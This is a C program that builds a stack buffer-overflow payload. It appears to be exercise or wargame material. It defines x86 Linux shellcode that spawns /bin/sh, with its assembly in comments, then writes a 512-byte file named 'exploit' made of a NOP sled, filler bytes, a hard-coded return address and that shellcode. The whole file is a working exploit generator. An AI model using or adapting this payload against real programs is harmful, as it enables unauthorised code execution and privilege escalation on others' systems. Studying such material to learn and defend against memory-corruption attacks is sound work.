#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x31\xc9"             /* xorl    %ecx,%ecx              */
  "\x31\xd2"             /* xorl    %edx,%edx              */
  "\xb0\x0b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */
;

int main(int argc, char **argv)
{
	char buffer[512];
	FILE *exploit;

	memset(&buffer, 0x90, 512);
	strcpy(buffer, "AAAABBBBCCCCDDDDEEEEFF\xdc\xce\xff\xff");
	strcpy(buffer+100,shellcode); 

	exploit = fopen("exploit", "w");
	fwrite(buffer, 512, 1, exploit);
	fclose(exploit);
	return 0;
}
